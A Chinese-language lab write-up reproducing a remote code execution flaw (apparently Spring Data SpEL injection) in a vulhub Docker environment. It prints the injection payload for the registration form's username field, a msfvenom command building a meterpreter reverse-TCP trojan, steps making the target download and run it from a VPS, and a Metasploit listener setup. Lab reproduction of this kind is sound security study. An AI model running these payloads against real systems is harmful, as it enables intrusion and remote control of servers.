一、复现工具：

> 1.docker+vulhub
>
> 2.burpsuite
>
> 3.一台vps（虚拟机也可以）

docker跟vulhub安装下载就不说了，网上多的是，下面启动漏洞环境的命令

> systemctl start docker 启动docker
>
> docker-compose up -d启动漏洞环境
>
> docker-compose down 删除漏洞环境

二、漏洞验证

1.访问<http://152.136.126.89:8080/users>填写注册信息抓包

![1](https://image.3001.net/images/20220907/1662530996_631835b46243415b1af0a.png!small)

2.把注册信息修改成payload，返回包返回包500说明执行成功

    
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
    

![](https://image.3001.net/images/20220907/1662531135_6318363fd6abf594af86f.png!small)

2.执行成功

![](https://image.3001.net/images/20220907/1662531278_631836ce91ff2023a6880.png!small)

三.反弹shell（正常反弹shell试过不行，这里用的是msf生成的木马，被攻击机器请求下载木马，监听，执行。）

1.在vps生成木马，木马会生成在当前文件夹下（我是进入msf里面生成的，在外面一样可以生成）

> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=vps地址 LPORT=监听端口 -f elf
> > shll.elf

生成以后给木马赋权

> chmod 777 shll.elf

![](https://image.3001.net/images/20220907/1662531356_6318371cba66b0e9de3de.png!small)

2.在木马的目录下开启web服务，浏览器可以访问就是成功了

![](https://image.3001.net/images/20220907/1662531386_6318373a99faa7e82f279.png!small)

![](https://image.3001.net/images/20220907/1662531399_631837470b4d2432c4429.png!small)

3.让vps请求下载木马，500是成功，一般是下载在当前目录下，我们可以去容器看下

进入容器命令：

> docker ps
>
> docker exec -it （CONTAINER ID）/bin/bash

![](https://image.3001.net/images/20220907/1662531533_631837cdc4fd28234683b.png!small)

![](https://image.3001.net/images/20220907/1662532163_63183a4384cb24136af8f.png!small)

4.用msf上开启监听

    
    
    msfconsole                                         # 在命令行里面输入命令，进入msf漏洞利用框架；
    use exploit/multi/handler                          # 监听木马反弹过来的shell
    set payload linux/x86/meterpreter/reverse_tcp  	   # 设置payload，不同的木马设置不同的payload，设置payload时，要根据目标系统的系统位数设置相应的payload;
    set lhost vps                                      # 我们的vps ip
    set lport vps端口                                  # 我们的vps端口
    exploit                                            # 开始进行监听；

![](https://image.3001.net/images/20220907/1662532272_63183ab0638acb666d0fb.png!small)

5.修改命令执行木马

> ./shll

![](https://image.3001.net/images/20220907/1662532297_63183ac9343738d589cec.png!small)

6.反弹成功

![](https://image.3001.net/images/20220907/1662532315_63183adb350028c079d00.png!small)

